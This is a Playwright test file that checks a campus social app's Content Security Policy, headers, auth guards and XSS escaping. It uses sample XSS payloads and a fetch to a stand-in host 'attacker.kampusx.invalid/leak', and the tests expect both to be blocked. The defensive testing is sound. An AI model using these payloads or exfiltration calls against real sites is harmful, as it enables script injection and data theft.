const { mockSocial } = require('../e2e/mock-social.cjs');
const { selectLargeVideo } = require('../e2e/video-fixture.cjs');
const { test, expect } = require('@playwright/test');
const path = require('node:path');
const { generateEnvironment } = require('../generate-environment.cjs');
const configuration = generateEnvironment({ root: path.resolve(__dirname, '../..'), strict: true });
const provider = new URL(configuration.supabaseUrl);
const storageKey = `sb-${provider.hostname.split('.')[0]}-auth-token`;
const user = {
  id: '11111111-1111-4111-8111-111111111111',
  aud: 'authenticated',
  role: 'authenticated',
  email: 'student@university.edu.tr',
  email_confirmed_at: '2026-01-01T00:00:00Z',
  app_metadata: { provider: 'email' },
  user_metadata: {
    username: 'student',
    full_name: 'Campus Student',
    university_name: 'Campus University',
    department_name: 'Computer Science',
  },
  identities: [],
};
async function initialize(page, language, theme, signedIn = true) {
  const errors = [];
  await mockSocial(page);
  page.on('pageerror', (error) => errors.push(error.message));
  const encode = (value) => Buffer.from(JSON.stringify(value)).toString('base64url');
  const expires = Math.floor(Date.now() / 1000) + 3600;
  const session = {
    access_token:
      encode({ alg: 'HS256', typ: 'JWT' }) +
      '.' +
      encode({ sub: user.id, aud: 'authenticated', exp: expires }) +
      '.local_test_signature',
    refresh_token: 'test_refresh',
    expires_at: expires,
    expires_in: 3600,
    token_type: 'bearer',
    user,
  };
  await page.addInitScript(
    ({ language, theme, session, storageKey, signedIn }) => {
      localStorage.setItem('kampusx-language', language);
      localStorage.setItem('kampusx-theme', theme);
      if (signedIn) sessionStorage.setItem(storageKey, JSON.stringify(session));
      window.securityViolations = [];
      document.addEventListener('securitypolicyviolation', (event) =>
        window.securityViolations.push(event.effectiveDirective),
      );
    },
    { language, theme, session, storageKey, signedIn },
  );
  const currentUser = structuredClone(user);
  // All production auth traffic is isolated; no live Auth or database mutation occurs.
  await page.route(`${provider.origin}/auth/v1/**`, (route) => {
    if (route.request().method() === 'PUT')
      currentUser.user_metadata = { ...currentUser.user_metadata, ...route.request().postDataJSON().data };
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(currentUser) });
  });
  return errors;
}
const png = {
  name: 'avatar.png',
  mimeType: 'image/png',
  buffer: Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAIAAABLbSncAAAAEUlEQVR4nGNQDH2BFTEMLQkA/vdXgZPglicAAAAASUVORK5CYII=',
    'base64',
  ),
};
for (const language of ['tr', 'en'])
  for (const theme of ['light', 'dark'])
    test(`production CSP preserves guarded profile, literal user content and photo previews ${language}/${theme}`, async ({
      page,
    }) => {
      await page.setViewportSize({ width: 390, height: 900 });
      const errors = await initialize(page, language, theme);
      const response = await page.goto('/profile/edit');
      expect(response.headers()['x-frame-options']).toBe('DENY');
      expect(response.headers()['x-content-type-options']).toBe('nosniff');
      expect(response.headers()['referrer-policy']).toBe('no-referrer');
      await expect(page.locator('#profile-name')).toBeVisible();
      const payload = '<img src=x onerror=alert(1)>';
      await page.locator('#profile-name').fill(payload);
      await page.locator('#profile-bio').fill('<svg onload=alert(1)>');
      await page.locator('#profile-avatar-file').setInputFiles(png);
      await expect(page.locator('.avatar-picker img')).toBeVisible();
      await page.getByRole('button', { name: language === 'tr' ? 'Kaydet' : 'Save', exact: true }).click();
      await expect(page).toHaveURL(/\/profile$/);
      await expect(page.getByRole('heading', { name: payload, exact: true })).toBeVisible();
      await expect(page.locator('.profile-bio')).toHaveText('<svg onload=alert(1)>');
      await expect(page.locator('.profile-identity img[src="x"],.profile-bio svg')).toHaveCount(0);
      await expect(page.locator('.large-avatar img')).toBeVisible();
      await expect(page.locator('html')).toHaveAttribute('lang', language);
      expect(await page.locator('html').evaluate((el) => el.classList.contains('dark'))).toBe(
        theme === 'dark',
      );
      expect(await page.evaluate(() => window.securityViolations)).toEqual([]);
      expect(errors).toEqual([]);
    });

test('production CSP blocks injected inline scripts and unauthorized network destinations', async ({
  page,
}) => {
  await initialize(page, 'tr', 'light');
  await page.route('**/profile', async (route) => {
    const response = await route.fetch();
    const html = await response.text();
    await route.fulfill({
      response,
      body: html.replace('</body>', '<script>window.injectedScriptExecuted = true;</script></body>'),
    });
  });
  await page.goto('/profile');
  await expect(page.getByRole('heading', { name: 'Campus Student', exact: true })).toBeVisible();
  await page.evaluate(async () => {
    try {
      await fetch('https://attacker.kampusx.invalid/leak');
    } catch {
      /* expected CSP refusal */
    }
  });
  await expect.poll(() => page.evaluate(() => window.securityViolations)).toContain('script-src-elem');
  await expect.poll(() => page.evaluate(() => window.securityViolations)).toContain('connect-src');
  expect(await page.evaluate(() => window.injectedScriptExecuted)).toBeUndefined();
});

test('valid JPEG and WebP still preview under the production image checks', async ({ page }) => {
  await initialize(page, 'tr', 'light');
  await page.goto('/profile/edit');
  await expect(page.locator('#profile-name')).toBeVisible();
  const files = [
    {
      name: 'photo.jpg',
      mimeType: 'image/jpeg',
      encoded:
        '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAIAAgDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDlaKKK/ST50//Z',
    },
    {
      name: 'photo.webp',
      mimeType: 'image/webp',
      encoded: 'UklGRjwAAABXRUJQVlA4IDAAAADQAQCdASoIAAgAAUAmJaACdLoB+AADsAD+8MQL/3ZP9sn+2T/5NP/lKvBY3ZsAAAA=',
    },
  ];
  for (const { name, mimeType, encoded } of files) {
    await page
      .locator('#profile-avatar-file')
      .setInputFiles({ name, mimeType, buffer: Buffer.from(encoded, 'base64') });
    await expect(page.locator('.avatar-picker img')).toBeVisible();
    await expect(page.locator('#profile-avatar-file-error')).toHaveText('');
  }
  expect(await page.evaluate(() => window.securityViolations)).toEqual([]);
});

test('production profile guards reject visitors with no session', async ({ page }) => {
  await initialize(page, 'tr', 'light', false);
  await page.goto('/profile');
  await expect(page).toHaveURL(/\/auth\/login$/);
  await expect(page.locator('kx-profile-header')).toHaveCount(0);
  expect(await page.evaluate(() => window.securityViolations)).toEqual([]);
});

test('follow routes reject visitors and never expose the pending-request interface', async ({ page }) => {
  await initialize(page, 'tr', 'light', false);
  for (const path of ['/profile/followers', '/profile/following', '/profile/requests']) {
    await page.goto(path);
    await expect(page).toHaveURL(/\/auth\/login$/);
    await expect(page.locator('kx-follow-person,.people-list')).toHaveCount(0);
  }
});

test('follow identities remain literal text and external avatar trackers are discarded', async ({ page }) => {
  const errors = await initialize(page, 'tr', 'light');
  const peer = '22222222-2222-4222-8222-222222222222';
  const payload = '<img src=x onerror="window.followXss=true">';
  const requested = [];
  page.on('request', (request) => {
    if (request.url().startsWith('https://attacker.kampusx.invalid/')) requested.push(request.url());
  });
  await mockSocial(page, {
    connections: [
      { follower_id: peer, following_id: user.id, status: 'pending', created_at: '2026-10-18T10:00:00Z' },
    ],
    people: [
      {
        user_id: peer,
        full_name: payload,
        username: '<svg onload=alert(1)>',
        avatar_url: 'https://attacker.kampusx.invalid/pixel.png',
        university: '<script>alert(1)</script>',
        studying: '<iframe src=x>',
      },
    ],
  });
  await page.goto('/profile/requests');
  const row = page.locator('.people-list kx-follow-person');
  await expect(row.locator('strong')).toHaveText(payload);
  await expect(row).toContainText('<script>alert(1)</script>');
  await expect(row.locator('img,svg,iframe,script')).toHaveCount(0);
  expect(await page.evaluate(() => window.followXss)).toBeUndefined();
  expect(requested).toEqual([]);
  expect(await page.evaluate(() => window.securityViolations)).toEqual([]);
  expect(errors).toEqual([]);
});

test('persisted post HTML stays literal and unsafe storage URLs are never requested', async ({ page }) => {
  const errors = await initialize(page, 'tr', 'dark');
  const backend = await mockSocial(page);
  const payload = '<img src=x onerror="window.postXss=true">';
  backend.posts[0].content = payload;
  backend.posts[0].media_url = `${provider.origin}/storage/v1/object/public/uploads/${user.id}/post/active.svg`;
  backend.posts[0].media_type = 'image';
  await page.goto('/dashboard');
  await expect(page.locator('.post-text').first()).toHaveText(payload);
  await expect(page.locator('kx-social-post-card img[src="x"]')).toHaveCount(0);
  expect(await page.evaluate(() => window.postXss)).toBeUndefined();
  expect(backend.requests.filter((request) => request.storage)).toHaveLength(0);
  expect(errors).toEqual([]);
});

test('production CSP blocks unauthorized image loads as well as fetch', async ({ page }) => {
  await initialize(page, 'en', 'light');
  await page.goto('/profile');
  await expect(page.getByRole('heading', { name: 'Campus Student', exact: true })).toBeVisible();
  await page.evaluate(() => {
    const image = new Image();
    image.src = 'https://attacker.kampusx.invalid/pixel';
    document.body.append(image);
  });
  await expect.poll(() => page.evaluate(() => window.securityViolations)).toContain('img-src');
});

test('production CSP permits only the local compression worker and a real large video prepares successfully', async ({
  page,
}) => {
  test.setTimeout(90000);
  await page.addInitScript(() => {
    const NativeWorker = window.Worker;
    window.Worker = class extends NativeWorker {
      constructor(...args) {
        super(...args);
        this.addEventListener('message', (event) => {
          if (event.data?.kind === 'done') window.preparedVideoBytes = event.data.file.size;
        });
      }
    };
  });
  const errors = await initialize(page, 'en', 'dark');
  await page.goto('/compose');
  const original = await selectLargeVideo(page);
  expect(original.bytes).toBeGreaterThan(50 * 1024 * 1024);
  await expect(page.locator('.attachment-preview video')).toBeVisible({ timeout: 60000 });
  const size = await page.evaluate(() => window.preparedVideoBytes);
  expect(size).toBeLessThan(50_000_000);
  expect(await page.evaluate(() => window.securityViolations)).toEqual([]);
  expect(errors).toEqual([]);
});
